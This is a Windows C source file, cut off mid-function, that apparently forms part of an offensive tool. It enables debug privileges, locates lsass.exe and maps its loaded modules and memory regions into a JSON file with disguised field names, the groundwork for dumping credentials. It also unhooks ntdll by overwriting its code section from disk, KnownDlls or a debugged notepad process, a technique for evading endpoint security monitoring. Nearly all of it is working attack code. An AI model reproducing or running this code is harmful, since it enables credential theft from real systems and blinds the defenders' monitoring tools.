#include <stdio.h>
#include <windows.h>


// Constants
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define MAX_MODULES 1024
#define SECTION_MAP_READ 0x0004
#define OBJ_CASE_INSENSITIVE 0x00000040
#define DEBUG_PROCESS 0x00000001


// Enums
typedef enum _PROCESSINFOCLASS {
    ProcessBasicInformation = 0,
} PROCESSINFOCLASS;


// Structs
typedef struct _TOKEN_PRIVILEGES_STRUCT {
    DWORD PrivilegeCount;
    LUID Luid;
    DWORD Attributes;
} TOKEN_PRIVILEGES_STRUCT, * PTOKEN_PRIVILEGES_STRUCT;

typedef struct {
    char base_dll_name[MAX_PATH];
    char full_dll_path[MAX_PATH];
    void* dll_base;
    int size;
} ModuleInformation;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;


// Functions
void InitializeObjectAttributes(POBJECT_ATTRIBUTES p, PUNICODE_STRING n, ULONG a) {
    p->Length = sizeof(OBJECT_ATTRIBUTES);
    p->RootDirectory = NULL;
    p->Attributes = a;
    p->ObjectName = n;
    p->SecurityDescriptor = NULL;
    p->SecurityQualityOfService = NULL;
}

UNICODE_STRING InitUnicodeString(LPCWSTR str) {
    UNICODE_STRING us;
    us.Buffer = (PWSTR)str;
    us.Length = wcslen(str) * sizeof(WCHAR);
    us.MaximumLength = us.Length + sizeof(WCHAR);
    return us;
}

typedef NTSTATUS(WINAPI* NtOpenProcessTokenFn)(HANDLE, DWORD, PHANDLE);
typedef NTSTATUS(WINAPI* NtAdjustPrivilegesTokenFn)(HANDLE, BOOL, PTOKEN_PRIVILEGES_STRUCT, DWORD, PVOID, PVOID);
typedef NTSTATUS(WINAPI* NtGetNextProcessFn)(HANDLE, ACCESS_MASK, ULONG, ULONG, PHANDLE);
typedef NTSTATUS(WINAPI* NtQueryInformationProcessFn)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS(WINAPI* NtReadVirtualMemoryFn)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(WINAPI* NtQueryVirtualMemory_t)(HANDLE, PVOID, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(WINAPI* NtOpenSectionFn)(HANDLE* SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes);
typedef NTSTATUS(WINAPI* NtCloseFn)(HANDLE);

NtOpenProcessTokenFn NtOpenProcessToken;
NtAdjustPrivilegesTokenFn NtAdjustPrivilegesToken;
NtGetNextProcessFn NtGetNextProcess;
NtQueryInformationProcessFn NtQueryInformationProcess;
NtReadVirtualMemoryFn NtReadVirtualMemory;
NtQueryVirtualMemory_t NtQueryVirtualMemory;
NtOpenSectionFn NtOpenSection;
NtCloseFn NtClose;


// Skeletons
char* GetProcNameFromHandle(HANDLE handle);
char* ReadRemoteWStr(HANDLE processHandle, PVOID address);
PVOID ReadRemoteIntPtr(HANDLE processHandle, PVOID address);


// Get SeDebugPrivilege privilege
void EnableDebugPrivileges() {
    HANDLE currentProcess = GetCurrentProcess();
    HANDLE tokenHandle = NULL;
    
    // Open the process token
    NTSTATUS ntstatus = NtOpenProcessToken(currentProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &tokenHandle);
    if (ntstatus != 0) {
        printf("[-] Error calling NtOpenProcessToken. NTSTATUS: 0x%08X\n", ntstatus);
        exit(-1);
    }

    // Set the privilege
    TOKEN_PRIVILEGES_STRUCT tokenPrivileges;
    tokenPrivileges.PrivilegeCount = 1;
    tokenPrivileges.Luid.LowPart = 20; // LookupPrivilegeValue(NULL, "SeDebugPrivilege", &luid) would normally be used to get this value
    tokenPrivileges.Luid.HighPart = 0;
    tokenPrivileges.Attributes = 0x00000002;

    ntstatus = NtAdjustPrivilegesToken(tokenHandle, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    if (ntstatus != 0) {
        printf("[-] Error calling NtAdjustPrivilegesToken. NTSTATUS: 0x%08X. Maybe you need to calculate the LowPart of the LUID using LookupPrivilegeValue.\n", ntstatus);
        NtClose(tokenHandle);
        exit(-1);
    }

    // Close the handle
    if (tokenHandle != NULL) {
        NtClose(tokenHandle);
    }

    printf("[+] Debug privileges enabled successfully.\n");
}


ModuleInformation* add_module(ModuleInformation* list, int counter, ModuleInformation new_module) {
    static int size = MAX_MODULES;
    // If the list is full, reallocate memory to double the size
    if (counter >= size) {
        size *= 2;
        list = (ModuleInformation*)realloc(list, size * sizeof(ModuleInformation));
        if (list == NULL) {
            printf("[-] Memory allocation failed!\n");
            return NULL;
        }
    }
    list[counter] = new_module;
    return list;
}


ModuleInformation* CustomGetModuleHandle(HANDLE hProcess) {
    ModuleInformation* module_list = (ModuleInformation*)malloc(1024 * sizeof(ModuleInformation));
    int module_counter = 0;

    int process_basic_information_size = 48;
    int peb_offset = 0x8;
    int ldr_offset = 0x18;
    int inInitializationOrderModuleList_offset = 0x30;
    int flink_dllbase_offset = 0x20;
    int flink_buffer_fulldllname_offset = 0x40;
    int flink_buffer_offset = 0x50;

    BYTE pbi_byte_array[48];
    void* pbi_addr = (void*)pbi_byte_array;

    ULONG ReturnLength;
    NTSTATUS ntstatus = NtQueryInformationProcess(hProcess, ProcessBasicInformation, pbi_addr, process_basic_information_size, &ReturnLength);
    if (ntstatus != 0) {
        printf("[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x%08X\n", ntstatus);
        return NULL;
    }

    void* peb_pointer = (void*)((uintptr_t)pbi_addr + peb_offset);
    void* pebaddress = *(void**)peb_pointer;

    //printf("[+] pbi_addr: \t\t0x%p \n", pbi_addr);
    //printf("[+] peb pointer: \t0x%p\n", peb_pointer);
    printf("[+] PEB Address: \t0x%p\n", pebaddress);

    void* ldr_pointer = (void*)((uintptr_t)pebaddress + ldr_offset);
    void* ldr_adress = ReadRemoteIntPtr(hProcess, ldr_pointer);

    void* InInitializationOrderModuleList = (void*)((uintptr_t)ldr_adress + inInitializationOrderModuleList_offset);
    void* next_flink = ReadRemoteIntPtr(hProcess, InInitializationOrderModuleList);

    printf("[+] Ldr Pointer: \t0x%p\n", ldr_pointer);
    printf("[+] Ldr Adress: \t0x%p\n", ldr_adress);
    // printf("[+] next_flink: \t0x%p\n", next_flink);

    void* dll_base = (void*)1337;
    while (dll_base != NULL) {
        next_flink = (void*)((uintptr_t)next_flink - 0x10);
        // Get DLL base address
        dll_base = ReadRemoteIntPtr(hProcess, (void*)((uintptr_t)next_flink + flink_dllbase_offset));

        void* buffer = ReadRemoteIntPtr(hProcess, (void*)((uintptr_t)next_flink + flink_buffer_offset));

        // printf("[+] next_flink: %p\n", next_flink);
        // printf("[+] buffer: %p\n", buffer);
        char* base_dll_name = ReadRemoteWStr(hProcess, buffer);
        // printf("[+] base dll name: %s\n", base_dll_name);

        // New ModuleInformation
        ModuleInformation new_module;
        strncpy_s(new_module.base_dll_name, base_dll_name, MAX_PATH - 1);

        // Full DLL Path
        //void* full_dll_name_addr = (char*)next_flink + flink_buffer_fulldllname_offset;
        void* full_dll_name_addr = ReadRemoteIntPtr(hProcess, (void*)((uintptr_t)next_flink + flink_buffer_fulldllname_offset));
        // printf("[+] full_dll_name_addr: %p\n", full_dll_name_addr);

        char* full_dll_name = ReadRemoteWStr(hProcess, full_dll_name_addr);
        // printf("[+] base dll name: %s\n", base_dll_name);
        // printf("[+] full dll name: %s\n", full_dll_name);

        // Complete ModuleInformation         
        strncpy_s(new_module.full_dll_path, full_dll_name, MAX_PATH - 1);
        new_module.dll_base = dll_base;
        new_module.size = 0;
        add_module(module_list, module_counter, new_module);
        module_counter++;

        next_flink = ReadRemoteIntPtr(hProcess, (void*)((uintptr_t)next_flink + 0x10));
    }

    return module_list;
}


// Read remote IntPtr (8-bytes)
PVOID ReadRemoteIntPtr(HANDLE hProcess, PVOID mem_address) {
    BYTE buff[8];
    SIZE_T bytesRead;
    NTSTATUS ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, sizeof(buff), &bytesRead);

    if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != NULL) {
        printf("[-] Error calling NtReadVirtualMemory (ReadRemoteIntPtr). NTSTATUS: 0x%X reading address 0x%p\n", ntstatus, mem_address);
        return NULL;
    }
    long long value = *(long long*)buff;
    return (PVOID)value;
}


// Read remote Unicode string
char* ReadRemoteWStr(HANDLE hProcess, PVOID mem_address) {
    BYTE buff[256];
    SIZE_T bytesRead;
    NTSTATUS ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, sizeof(buff), &bytesRead);

    if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != NULL) {
        printf("[-] Error calling NtReadVirtualMemory (ReadRemoteWStr). NTSTATUS: 0x%X reading address 0x%p\n", ntstatus, mem_address);
    }

    static char unicode_str[128];
    int str_index = 0;

    for (int i = 0; i < sizeof(buff) - 1; i += 2) {
        if (buff[i] == 0 && buff[i + 1] == 0) {
            break;
        }
        wchar_t wch = *(wchar_t*)&buff[i];
        unicode_str[str_index++] = (char)wch;
    }
    unicode_str[str_index] = '\0';
    return unicode_str;
}


char* GetProcNameFromHandle(HANDLE process_handle) {
    const int process_basic_information_size = 48;
    const int peb_offset = 0x8;
    const int commandline_offset = 0x68;
    const int processparameters_offset = 0x20;

    unsigned char pbi_byte_array[process_basic_information_size];
    void* pbi_addr = NULL;
    pbi_addr = (void*)pbi_byte_array;

    // Query process information
    ULONG returnLength;
    NTSTATUS ntstatus = NtQueryInformationProcess(process_handle, ProcessBasicInformation, pbi_addr, process_basic_information_size, &returnLength);
    if (ntstatus != 0) {
        printf("[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x%08X\n", ntstatus);
        return NULL;
    }

    // Get PEB Base Address
    PVOID peb_pointer = (PVOID)((BYTE*)pbi_addr + peb_offset);
    PVOID pebaddress = *(PVOID*)peb_pointer;

    // Get PEB->ProcessParameters
    PVOID processparameters_pointer = (PVOID)((BYTE*)pebaddress + processparameters_offset);

    // Get ProcessParameters->CommandLine
    PVOID processparameters_address = ReadRemoteIntPtr(process_handle, processparameters_pointer);
    PVOID commandline_pointer = (PVOID)((BYTE*)processparameters_address + commandline_offset);
    PVOID commandline_address = ReadRemoteIntPtr(process_handle, commandline_pointer);
    char* commandline_value = ReadRemoteWStr(process_handle, commandline_address);

    return commandline_value;
}


HANDLE GetProcessByName(const char* proc_name) {
    HANDLE aux_handle = NULL;

    // Iterate processes
    while (NT_SUCCESS(NtGetNextProcess(aux_handle, MAXIMUM_ALLOWED, 0, 0, &aux_handle))) {
        char* current_proc_name = GetProcNameFromHandle(aux_handle);
        //printf("aux_handle: %d\n", aux_handle);
        //printf("[+] current_proc_name: %s\n ", current_proc_name);
        if (current_proc_name && strcmp(current_proc_name, proc_name) == 0) {
            return aux_handle;
        }
    }
    return NULL;
}


// Function to find a module by name
ModuleInformation find_module_by_name(ModuleInformation* module_list, int list_size, const char* aux_name) {
    for (int i = 0; i < list_size; i++) {
        if (strcmp(module_list[i].base_dll_name, aux_name) == 0) {
            return module_list[i];  // Return a pointer to the matching module
        }
    }
    // no match is found
    ModuleInformation empty_module = { "", "", NULL, 0 };
    return empty_module;
}


// Function to find a module index by name
int find_module_index_by_name(ModuleInformation* module_list, int list_size, const char* aux_name) {
    for (int i = 0; i < list_size; i++) {
        if (strcmp(module_list[i].base_dll_name, aux_name) == 0) {
            return i;  // Return the index of the matching module
        }
    }
    return -1;  // Return -1 if no match is found
}


// Replace \ for \\ 
void replace_backslash(char* str, char* result) {
    int i, j = 0;
    for (i = 0; str[i] != '\0'; i++) {
        if (str[i] == '\\') {
            result[j++] = '\\';
            result[j++] = '\\';
        }
        else {
            result[j++] = str[i];
        }
    }
    result[j] = '\0';
}


int Shock(const char* filename) {
    EnableDebugPrivileges();
    HANDLE hProcess = GetProcessByName("C:\\WINDOWS\\system32\\lsass.exe");
    printf("[+] Process handle:\t%d\n", hProcess);

    // List to get modules information
    ModuleInformation* moduleInformationList = CustomGetModuleHandle(hProcess);
    int module_counter = 0;

    for (int i = 0; i < MAX_MODULES; i++) {
        if (strcmp(moduleInformationList[i].base_dll_name, "")) {
            module_counter++;
            //printf("%d %s (%s)\n", module_counter, moduleInformationList[i].base_dll_name, moduleInformationList[i].full_dll_path);
        }
    }
    printf("[+] Processed %d modules\n", module_counter);

    // Initialize variables
    long long proc_max_address_l = 0x7FFFFFFEFFFF;
    PVOID mem_address = 0;
    int aux_size = 0;
    char aux_name[MAX_PATH] = "";

    // Loop through the memory regions
    while ((long long)mem_address < proc_max_address_l) {
        MEMORY_BASIC_INFORMATION mbi;
        SIZE_T returnSize;

        // Populate MEMORY_BASIC_INFORMATION struct
        NTSTATUS ntstatus = NtQueryVirtualMemory(hProcess, mem_address, 0, &mbi, sizeof(mbi), &returnSize);
        if (ntstatus != 0) {
            printf("[-] Error calling NtQueryVirtualMemory. NTSTATUS: 0x%lx\n", ntstatus);
        }

        // If readable and committed --> Get information
        if (mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT) {
            // Find the module by name
            ModuleInformation aux_module = find_module_by_name(moduleInformationList, module_counter, aux_name);

            if (mbi.RegionSize == 0x1000 && mbi.BaseAddress != aux_module.dll_base) {
                aux_module.size = aux_size;
                // Find module index
                int aux_index = find_module_index_by_name(moduleInformationList, module_counter, aux_name);
                moduleInformationList[aux_index] = aux_module;
                for (int k = 0; k < module_counter; k++) {
                    if (mbi.BaseAddress == moduleInformationList[k].dll_base) {                        
                        strcpy_s(aux_name, moduleInformationList[k].base_dll_name);
                        aux_size = (int)mbi.RegionSize;
                    }
                }
            }
            else {
                aux_size += (int)mbi.RegionSize;
            }
        }
        // printf("%p\n", mem_address);
        mem_address = (PVOID)((ULONG_PTR)mem_address + mbi.RegionSize);
    }

    // Create JSON
    char json_output[256 * 400] = "[";  // Estimation
    for (int i = 0; i < module_counter; i++) {
        char full_dll_name_fixed[256];
        replace_backslash(moduleInformationList[i].full_dll_path, full_dll_name_fixed);
        
        if (moduleInformationList[i].dll_base != 0) {
            char json_item[256];
            sprintf_s(json_item, sizeof(json_item),
                "{\"field0\":\"%s\",\"field1\":\"%s\",\"field2\":\"0x%p\",\"field3\":\"%d\"}%s",
                moduleInformationList[i].base_dll_name,
                full_dll_name_fixed, // moduleInformationList[i].full_dll_path,
                moduleInformationList[i].dll_base,
                moduleInformationList[i].size,
                (i < module_counter - 1) ? "," : "");
            strcat_s(json_output, sizeof(json_output), json_item);
        }
    }
    size_t len = strlen(json_output);
    json_output[len - 1] = '\0';
    strcat_s(json_output, sizeof(json_output), "]");

    // Write to file
    FILE* file;
    errno_t err = fopen_s(&file, filename, "w");
    if (file == NULL) {
        printf("[-] Error opening file %s\n", filename);
        return 1;
    }
    fprintf(file, "%s", json_output);
    fclose(file);
    printf("[+] File %s generated.\n", filename);
}


/////////////////////////////////////////////////////////////////////////////////////////////////////////
// Overwrite hooked ntdll .text section with a clean version
void ReplaceNtdllTxtSection(LPVOID unhookedNtdllTxt, LPVOID localNtdllTxt, SIZE_T localNtdllTxtSize) {
    DWORD dwOldProtection;

    // VirtualProtect to PAGE_EXECUTE_WRITECOPY
    if (!VirtualProtect(localNtdllTxt, localNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtection)) {
        printf("[-] Error calling VirtualProtect (PAGE_EXECUTE_WRITECOPY)\n");
        ExitProcess(0);
    }
    // getchar();

    // Copy from one address to the other
    memcpy(localNtdllTxt, unhookedNtdllTxt, localNtdllTxtSize);
    // getchar();

    // VirtualProtect back to the original protection
    if (!VirtualProtect(localNtdllTxt, localNtdllTxtSize, dwOldProtection, &dwOldProtection)) {
        printf("[-] Error calling VirtualProtect (dwOldProtection)\n");
        ExitProcess(0);
    }
}


// Get BaseOfCode and SizeOfCode
int* GetTextSectionInfo(LPVOID ntdll_address) {
    HANDLE hProcess = GetCurrentProcess();
    BYTE data[4];

    // Check MZ Signature (2 bytes)
    BYTE signature_dos_header[2];
    SIZE_T bytesRead;
    if (!ReadProcessMemory(hProcess, ntdll_address, signature_dos_header, 2, &bytesRead) || bytesRead != 2) {
        printf("[-] Error reading DOS header signature\n");
        ExitProcess(0);
    }

    if (signature_dos_header[0] != 'M' || signature_dos_header[1] != 'Z') {
        printf("[-] Incorrect DOS header signature\n");
        ExitProcess(0);
    }

    // Read e_lfanew (4 bytes) at offset 0x3C
    DWORD e_lfanew;
    if (!ReadProcessMemory(hProcess, (BYTE*)ntdll_address + 0x3C, &e_lfanew, 4, &bytesRead) || bytesRead != 4) {
        printf("[-] Error reading e_lfanew\n");
        ExitProcess(0);
    }

    // Check PE Signature (2 bytes)
    BYTE signature_nt_header[2];
    if (!ReadProcessMemory(hProcess, (BYTE*)ntdll_address + e_lfanew, signature_nt_header, 2, &bytesRead) || bytesRead != 2) {
        printf("[-] Error reading NT header signature\n");
        ExitProcess(0);
    }

    if (signature_nt_header[0] != 'P' || signature_nt_header[1] != 'E') {
        printf("[-] Incorrect NT header signature\n");
        ExitProcess(0);
    }

    // Check Optional Headers Magic field value (2 bytes)
    WORD optional_header_magic;
    if (!ReadProcessMemory(hProcess, (BYTE*)ntdll_address + e_lfanew + 24, &optional_header_magic, 2, &bytesRead) || bytesRead != 2) {
        printf("[-] Error reading Optional Header Magic\n");
        ExitProcess(0);
    }

    if (optional_header_magic != 0x20B && optional_header_magic != 0x10B) {
        printf("[-] Incorrect Optional Header Magic field value\n");
        ExitProcess(0);
    }

    // Read SizeOfCode (4 bytes)
    DWORD sizeofcode;
    if (!ReadProcessMemory(hProcess, (BYTE*)ntdll_address + e_lfanew + 24 + 4, &sizeofcode, 4, &bytesRead) || bytesRead != 4) {
        printf("[-] Error reading SizeOfCode\n");
        ExitProcess(0);
    }

    // Read BaseOfCode (4 bytes)
    DWORD baseofcode;
    if (!ReadProcessMemory(hProcess, (BYTE*)ntdll_address + e_lfanew + 24 + 20, &baseofcode, 4, &bytesRead) || bytesRead != 4) {
        printf("[-] Error reading BaseOfCode\n");
        ExitProcess(0);
    }

    // Return BaseOfCode and SizeOfCode as an array
    static int result[2];
    result[0] = baseofcode;
    result[1] = sizeofcode;

    return result;
}


LPVOID GetModuleAddress(const char* dll_name) {
    // ModuleInformation* module_list = (ModuleInformation*)malloc(1024 * sizeof(ModuleInformation));
    int module_counter = 0;

    int process_basic_information_size = 48;
    int peb_offset = 0x8;
    int ldr_offset = 0x18;
    int inInitializationOrderModuleList_offset = 0x30;
    int flink_dllbase_offset = 0x20;
    int flink_buffer_fulldllname_offset = 0x40;
    int flink_buffer_offset = 0x50;

    BYTE pbi_byte_array[48];
    void* pbi_addr = (void*)pbi_byte_array;

    ULONG ReturnLength;
    HANDLE hProcess = GetCurrentProcess();
    NTSTATUS ntstatus = NtQueryInformationProcess(hProcess, ProcessBasicInformation, pbi_addr, process_basic_information_size, &ReturnLength);
    if (ntstatus != 0) {
        printf("[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x%08X\n", ntstatus);
        return NULL;
    }

    void* peb_pointer = (void*)((uintptr_t)pbi_addr + peb_offset);
    void* pebaddress = *(void**)peb_pointer;

    //printf("[+] pbi_addr: \t\t0x%p \n", pbi_addr);
    //printf("[+] peb pointer: \t0x%p\n", peb_pointer);
    void* ldr_pointer = (void*)((uintptr_t)pebaddress + ldr_offset);
    void* ldr_adress = ReadRemoteIntPtr(hProcess, ldr_pointer);

    void* InInitializationOrderModuleList = (void*)((uintptr_t)ldr_adress + inInitializationOrderModuleList_offset);
    void* next_flink = ReadRemoteIntPtr(hProcess, InInitializationOrderModuleList);

    void* dll_base = (void*)1337;
    while (dll_base != NULL) {
        next_flink = (void*)((uintptr_t)next_flink - 0x10);

        // Get DLL base address
        dll_base = ReadRemoteIntPtr(hProcess, (void*)((uintptr_t)next_flink + flink_dllbase_offset));
        void* buffer = ReadRemoteIntPtr(hProcess, (void*)((uintptr_t)next_flink + flink_buffer_offset));
        char* base_dll_name = ReadRemoteWStr(hProcess, buffer);

        // Compare (but it is always the first...)
        if (strcmp(base_dll_name, dll_name) == 0) {
            return dll_base;
        }
        next_flink = ReadRemoteIntPtr(hProcess, (void*)((uintptr_t)next_flink + 0x10));
    }

    return 0;
}


// Map ntdl.dll from the file in disk and return view address
LPVOID MapNtdllFromDisk(const char* ntdll_path) {
    // CreateFileA
    HANDLE hFile = CreateFileA(ntdll_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Error calling CreateFileA\n");
        ExitProcess(0);
    }

    // CreateFileMappingA
    HANDLE hSection = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE_NO_EXECUTE, 0, 0, NULL);
    if (hSection == NULL) {
        printf("[-] Error calling CreateFileMappingA\n");
        CloseHandle(hFile);
        ExitProcess(0);
    }

    // MapViewOfFile
    LPVOID pNtdllBuffer = MapViewOfFile(hSection, FILE_MAP_READ, 0, 0, 0);
    if (pNtdllBuffer == NULL) {
        printf("[-] Error calling MapViewOfFile\n");
        CloseHandle(hSection);
        CloseHandle(hFile);
        ExitProcess(0);
    }

    // Close handles
    if (!CloseHandle(hFile) || !CloseHandle(hSection)) {
        printf("[-] Error calling CloseHandle\n");
        ExitProcess(0);
    }

    return pNtdllBuffer;
}


LPVOID MapNtdllFromKnownDlls() {
    LPCWSTR dll_name = L"\\KnownDlls\\ntdll.dll";

    if (sizeof(void*) == 4) {
        dll_name = L"\\KnownDlls32\\ntdll.dll";
    }

    UNICODE_STRING us = InitUnicodeString(dll_name);
    OBJECT_ATTRIBUTES obj_attr;
    InitializeObjectAttributes(&obj_attr, &us, OBJ_CASE_INSENSITIVE);

    HANDLE hSection = NULL;
    NTSTATUS status = NtOpenSection(&hSection, SECTION_MAP_READ, &obj_attr);
    if (status != 0) {
        wprintf(L"[-] Error calling NtOpenSection. NTSTATUS: 0x%X\n", status);
        ExitProcess(0);
    }

    PVOID pNtdllBuffer = MapViewOfFile(hSection, SECTION_MAP_READ, 0, 0, 0);
    if (pNtdllBuffer == NULL) {
        wprintf(L"[-] Error calling MapViewOfFile\n");
        ExitProcess(0);
    }

    status = NtClose(hSection);
    if (status != 0) {
        wprintf(L"[-] Error calling CloseHandle\n");
        ExitProcess(0);
    }

    return pNtdllBuffer;
}


LPVOID MapNtdllFromDebugProc(LPCSTR process_path) {
    STARTUPINFOA si = { 0 };
    si.cb = sizeof(STARTUPINFOA);
    PROCESS_INFORMATION pi = { 0 };

    BOOL createprocess_res = CreateProcessA(
        process_path,
        NULL,
        NULL,
        NULL,
        FALSE,
        DEBUG_PROCESS,
        NULL,
        NULL,
        &si,
        &pi
    );

    if (!createprocess_res) {
        printf("[-] Error calling CreateProcess\n");
        ExitProcess(0);
    }

    HANDLE localNtdllHandle = GetModuleAddress("ntdll.dll");
    int* result = GetTextSectionInfo(localNtdllHandle);
    int localNtdllTxtBase = result[0];
    int localNtdllTxtSize = result[1];
    LPVOID localNtdllTxt = (LPVOID)((DWORD_PTR)localNtdllHandle + localNtdllTxtBase);

    BYTE* ntdllBuffer = (BYTE*)malloc(localNtdllTxtSize);
    SIZE_T bytesRead;
    BOOL readprocmem_res = ReadProcessMemory(
        pi.hProcess,
        localNtdllTxt,
        ntdllBuffer,
        localNtdllTxtSize,
        &bytesRead
    );

    if (!readprocmem_res) {
        printf("[-] Error calling ReadProcessMemory\n");
        ExitProcess(0);
    }

    LPVOID pNtdllBuffer = (LPVOID)ntdllBuffer;

    BOOL debugstop_res = DebugActiveProcessStop(pi.dwProcessId);
    BOOL terminateproc_res = TerminateProcess(pi.hProcess, 0);
    if (!debugstop_res || !terminateproc_res) {
        printf("[-] Error calling DebugActiveProcessStop or TerminateProcess\n");
        ExitProcess(0);
    }

    BOOL closehandle_proc = CloseHandle(pi.hProcess);
    BOOL closehandle_thread = CloseHandle(pi.hThread);
    if (!closehandle_proc || !closehandle_thread) {
        printf("[-] Error calling CloseHandle\n");
        ExitProcess(0);
    }

    return pNtdllBuffer;
}


void ReplaceLibrary(const char* option) {
    const int offset_mappeddll = 4096;
    long long unhookedNtdllTxt = 0;

    if (strcmp(option, "disk") == 0) {
        // printf("[+] Option: Disk\n");
        const char* ntdll_path = "C:\\Windows\\System32\\ntdll.dll";
        LPVOID unhookedNtdllHandle = MapNtdllFromDisk(ntdll_path);
        unhookedNtdllTxt = (long long)unhookedNtdllHandle + offset_mappeddll;
    }
    else if (strcmp(option, "knowndlls") == 0) {
        // printf("[+] Option: Knowndlls\n");
        LPVOID unhookedNtdllHandle = MapNtdllFromKnownDlls();
        unhookedNtdllTxt = (long long)unhookedNtdllHandle + offset_mappeddll;
    }
    else if (strcmp(option, "debugproc") == 0) {
        // printf("[+] Option: Debugproc\n");
        const char* proc_path = "c:\\Windows\\System32\\notepad.exe";
        unhookedNtdllTxt = (long long)MapNtdllFromDebugProc(proc_path);
    }
    else {
        return;
    }

    const char* targetDll = "ntdll.dll";
    LPVOID localNtdllHandle = GetModuleAddress(targetDll);
    int* textSectionInfo = GetTextSectionInfo(localNtdllHandle);
    int localNtdllTxtBase = textSectionInfo[0];
    int localNtdllTxtSize = textSectionInfo[1];
    long long localNtdllTxt = (long long)localNtdllHandle + localNtdllTxtBase;

    printf("[+] Copying %d bytes from 0x%p to 0x%p.\n", localNtdllTxtSize, unhookedNtdllTxt, localNtdllTxt);
    ReplaceNtdllTxtSection((LPVOID)unhookedNtdllTxt, (LPVOID)localNtdllTxt, localNtdllTxtSize);
}
/////////////////////////////////////////////////////////////////////////////////////////////////////////


void* CustomGetProcAddress(void* pDosHdr, const char* func_name) {
    // Offsets for 32-bit and 64-bit processes
    int exportrva_offset = 136; // 64-bit
    // Get current process handle
    HANDLE hProcess = GetCurrentProcess();
    // DOS header (IMAGE_DOS_HEADER)->e_lfanew
    DWORD e_lfanew_value = 0;
    SIZE_T aux = 0;
    NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + 0x3C, &e_lfanew_value, sizeof(e_lfanew_value), &aux);
    // printf("[*] e_lfanew: \t\t\t\t\t0x%X\n", e_lfanew_value);
    // NT Header (IMAGE_NT_HEADERS)->FileHeader(IMAGE_FILE_HEADER)->SizeOfOptionalHeader
    WORD sizeopthdr_value = 0;
    NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + e_lfanew_value + 20, &sizeopthdr_value, sizeof(sizeopthdr_value), &aux);
    // printf("[*] SizeOfOptionalHeader: \t\t\t0x%X\n", sizeopthdr_value);
    // Optional Header(IMAGE_OPTIONAL_HEADER64)->DataDirectory(IMAGE_DATA_DIRECTORY)[0]->VirtualAddress
    DWORD exportTableRVA_value = 0;
    NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + e_lfanew_value + exportrva_offset, &exportTableRVA_value, sizeof(exportTableRVA_value), &aux);
    // printf("[*] exportTableRVA address: \t\t\t0x%X\n", exportTableRVA_value);
    if (exportTableRVA_value != 0) {
        // Read NumberOfNames: ExportTable(IMAGE_EXPORT_DIRECTORY)->NumberOfNames
        DWORD numberOfNames_value = 0;
        NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + exportTableRVA_value + 0x18, &numberOfNames_value, sizeof(numberOfNames_value), &aux);
        // printf("[*] numberOfNames: \t\t\t\t0x%X\n", numberOfNames_value);
        // Read AddressOfFunctions: ExportTable(IMAGE_EXPORT_DIRECTORY)->AddressOfFunctions
        DWORD addressOfFunctionsVRA_value = 0;
        NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + exportTableRVA_value + 0x1C, &addressOfFunctionsVRA_value, sizeof(addressOfFunctionsVRA_value), &aux);
        // printf("[*] addressOfFunctionsVRA: \t\t\t0x%X\n", addressOfFunctionsVRA_value);
        // Read AddressOfNames: ExportTable(IMAGE_EXPORT_DIRECTORY)->AddressOfNames
        DWORD addressOfNamesVRA_value = 0;
        NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + exportTableRVA_value + 0x20, &addressOfNamesVRA_value, sizeof(addressOfNamesVRA_value), &aux);
        // printf("[*] addressOfNamesVRA: \t\t\t\t0x%X\n", addressOfNamesVRA_value);
        // Read AddressOfNameOrdinals: ExportTable(IMAGE_EXPORT_DIRECTORY)->AddressOfNameOrdinals
        DWORD addressOfNameOrdinalsVRA_value = 0;
        NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + exportTableRVA_value + 0x24, &addressOfNameOrdinalsVRA_value, sizeof(addressOfNameOrdinalsVRA_value), &aux);
        // printf("[*] addressOfNameOrdinalsVRA: \t\t\t0x%X\n", addressOfNameOrdinalsVRA_value);
        void* addressOfFunctionsRA = (BYTE*)pDosHdr + addressOfFunctionsVRA_value;
        void* addressOfNamesRA = (BYTE*)pDosHdr + addressOfNamesVRA_value;
        void* addressOfNameOrdinalsRA = (BYTE*)pDosHdr + addressOfNameOrdinalsVRA_value;
        for (int i = 0; i < numberOfNames_value; i++) {
            DWORD functionAddressVRA = 0;
            NtReadVirtualMemory(hProcess, addressOfNamesRA, &functionAddressVRA, sizeof(functionAddressVRA), &aux);
            void* functionAddressRA = (BYTE*)pDosHdr + functionAddressVRA;
            char functionName[256];
            NtReadVirtualMemory(hProcess, functionAddressRA, functionName, strlen(func_name) + 1, &aux);
